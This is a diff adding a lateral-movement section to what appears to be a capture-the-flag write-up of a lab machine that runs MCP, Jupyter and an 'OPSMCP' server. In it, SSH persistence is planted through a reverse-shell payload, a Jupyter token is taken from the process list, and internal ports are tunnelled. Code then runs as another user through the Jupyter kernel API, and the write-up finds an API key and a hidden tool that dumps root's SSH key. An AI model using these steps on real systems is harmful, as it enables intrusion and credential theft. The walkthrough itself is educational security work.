@@ -813,6 +813,188 @@ Shell received as `mcp-dev` in the Inspector's working directory.
 <div style="page-break-after: always;"></div>
 
 ## 4. Lateral Movement
+
+### 4.1 SSH Persistence
+
+Before chasing lateral movement, SSH persistence was established to avoid relying on the fragile reverse shell connection. The `mcp-dev` account's `.ssh` directory was created and populated via the same `/api/mcp/connect` stdio transport — this time running a Python one-liner that performed the key setup inline before connecting the reverse shell.
+
+**Command:** `ssh-keygen -t ed25519 -f /home/kali/DevHub/devhub_key -N ""`
+
+**Breakdown:**
+- `ssh-keygen` — Generate an SSH key pair.
+- `-t ed25519` — Use the Ed25519 algorithm, which is compact and modern.
+- `-f /home/kali/DevHub/devhub_key` — Output path for the private key; the public key is written to the same path with `.pub` appended.
+- `-N ""` — Empty passphrase for automated use.
+
+**Result:**
+```shell
+Generating public/private ed25519 key pair.
+Your identification has been saved in /home/kali/DevHub/devhub_key
+Your public key has been saved in /home/kali/DevHub/devhub_key.pub
+```
+
+The public key was injected into `/home/mcp-dev/.ssh/authorized_keys` by modifying the reverse shell payload to call `os.makedirs` and `open(...,'a').write(...)` before initiating the socket connection. Verification:
+
+**Command:** `ssh -i /home/kali/DevHub/devhub_key -o StrictHostKeyChecking=no mcp-dev@TARGET_IP "id"`
+
+**Result:**
+```shell
+uid=1001(mcp-dev) gid=1001(mcp-dev) groups=1001(mcp-dev)
+```
+
+SSH authentication successful without password — persistence established.
+
+### 4.2 Process Table — Credential Leak
+
+**Command:** `ssh -i devhub_key mcp-dev@TARGET_IP "ps aux | grep -E 'jupyter|python|analyst'"`
+
+**Breakdown:**
+- `ps aux` — Show all processes (`a` = all users, `u` = user-oriented format, `x` = processes without controlling terminal).
+- `grep -E 'jupyter|python|analyst'` — Filter to show only processes relevant to the Jupyter and analyst user context.
+
+**Result:**
+```shell
+analyst   1055  0.1  2.4 182524 96580 ?  Ss   10:51   0:07 /home/analyst/jupyter-env/bin/python3 \
+  /home/analyst/jupyter-env/bin/jupyter-lab \
+  --ip=127.0.0.1 --port=8888 --no-browser \
+  --notebook-dir=/home/analyst/notebooks \
+  --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 \
+  --ServerApp.password= --ServerApp.allow_origin=
+
+root      1061  0.0  0.7 111108 28948 ?  Ss   10:51   0:02 /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
+```
+
+**Key finding:** Two critical discoveries in one command:
+1. **Jupyter token exposed:** `a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7` — passed as a CLI argument, visible to any user with `ps` access.
+2. **OPSMCP runs as root:** PID 1061, launched by root — any code it executes runs with full system privileges.
+
+This is a classic process argument credential leak. Jupyter's `--ServerApp.token` flag is passed on the command line rather than being read from an environment variable or config file, making it visible to all local users via `/proc/<pid>/cmdline` and `ps aux`.
+
+### 4.3 SSH Port Forwarding — Tunnel to Internal Services
+
+With SSH access as `mcp-dev` and the Jupyter token in hand, SSH port forwarding was used to bring the internal services to the attacker machine.
+
+**Command:** `ssh -i devhub_key -L 18888:127.0.0.1:8888 -L 15000:127.0.0.1:5000 mcp-dev@TARGET_IP -N -f`
+
+**Breakdown:**
+- `-L 18888:127.0.0.1:8888` — Forward local port 18888 to `127.0.0.1:8888` on the remote host (Jupyter). Local port 18888 is chosen to avoid conflicts with any local Jupyter instance.
+- `-L 15000:127.0.0.1:5000` — Forward local port 15000 to `127.0.0.1:5000` on the remote host (OPSMCP Flask).
+- `-N` — Do not execute a remote command — just maintain the tunnel.
+- `-f` — Fork to background after authenticating, leaving the terminal free.
+
+**Result:**
+```shell
+kali@kali:~$ ssh -i devhub_key \
+  -L 18888:127.0.0.1:8888 \
+  -L 15000:127.0.0.1:5000 \
+  mcp-dev@10.129.245.216 -N -f
+[Process backgrounded]
+```
+
+Tunnel verification:
+
+```shell
+kali@kali:~$ curl -s http://localhost:18888/api
+{"version": "2.17.0"}
+
+kali@kali:~$ curl -s http://localhost:15000/health
+{"status":"healthy","uptime":"14d 3h 22m"}
+```
+
+Both services are now accessible locally on the attacker machine.
+
+### 4.4 Jupyter Code Execution as `analyst`
+
+With the Jupyter token and a local tunnel established, the Jupyter REST API was used to spawn a kernel and execute Python code in the context of the `analyst` user.
+
+**Theory Block — Jupyter Kernel Code Execution:**
+Jupyter's REST API allows creating compute kernels and then communicating with them via WebSocket using the Jupyter messaging protocol. A kernel is an isolated Python interpreter process owned by the user who launched Jupyter (in this case, `analyst`). By creating a kernel and sending `execute_request` messages over the WebSocket, any code executed runs as `analyst` — including reading files owned by that user and those readable by `analyst`'s group.
+
+**Step 1 — Create a kernel:**
+
+**Command:** `curl -s -X POST -H "Authorization: token $TOKEN" -H "Content-Type: application/json" -d '{"name":"python3"}' http://localhost:18888/api/kernels`
+
+**Breakdown:**
+- `Authorization: token $TOKEN` — Jupyter's token-based authentication; the token is prepended with `token ` per the protocol.
+- `-d '{"name":"python3"}'` — Request a Python 3 kernel (the only available kernel on this system).
+
+**Result:**
+```shell
+{"id": "c5597c34-93d8-4885-bed9-b33404eec5ab", "name": "python3",
+ "last_activity": "2026-06-06T12:25:06.120753Z", "execution_state": "starting", "connections": 0}
+```
+
+Kernel ID: `c5597c34-93d8-4885-bed9-b33404eec5ab`
+
+**Step 2 — Execute code via WebSocket:**
+
+A Python script using `websocket-client` was written to connect to the kernel WebSocket endpoint, send an `execute_request` message, and collect the `stream` output:
+
+```python
+import json, uuid, time, threading, websocket
+
+TOKEN     = "a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
+KERNEL_ID = "c5597c34-93d8-4885-bed9-b33404eec5ab"
+
+CODE = """
+import os
+print("=== id ===")
+print(os.popen("id").read().strip())
+
+print("\\n=== USER FLAG ===")
+try:
+    print(open('/home/analyst/user.txt').read().strip())
+except Exception as e:
+    print(f"ERROR: {e}")
+
+print("\\n=== /opt/opsmcp/server.py ===")
+try:
+    print(open('/opt/opsmcp/server.py').read())
+except Exception as e:
+    print(f"ERROR: {e}")
+"""
+```
+
+**Command:** `python3 /home/kali/DevHub/jupyter_exec.py`
+
+**Result:**
+```shell
+=== id ===
+uid=1002(analyst) gid=1002(analyst) groups=1002(analyst)
+
+=== USER FLAG ===
+c442f5299f0ae6dee0346e40b279f5ae
+
+=== /opt/opsmcp/server.py ===
+#!/usr/bin/env python3
+"""
+OPSMCP - Operations MCP Server
+"""
+...
+VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
+...
+HIDDEN_TOOLS = {
+    "ops._admin_dump": {
+        "description": "Emergency credential dump - INTERNAL ONLY",
+        "parameters": {"target": "string", "confirm": "boolean"}
+    },
+    ...
+}
+...
+    elif tool_name == "ops._admin_dump":
+        if target == "ssh_keys":
+            with open('/root/.ssh/id_rsa', 'r') as f:
+                key_data = f.read()
+            return jsonify({
+                "root_private_key": key_data,
+                ...
+            })
+```
+
+**Key finding:** User flag captured. The OPSMCP source code reveals:
+- `VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"` — the authentication credential.
+- A hidden tool `ops._admin_dump` that is not included in `/tools/list` but is callable via `/tools/call`.
+- When called with `target="ssh_keys"` and `confirm=true`, it reads and returns `/root/.ssh/id_rsa`.
 <div align="center">
 <br>
 <br>
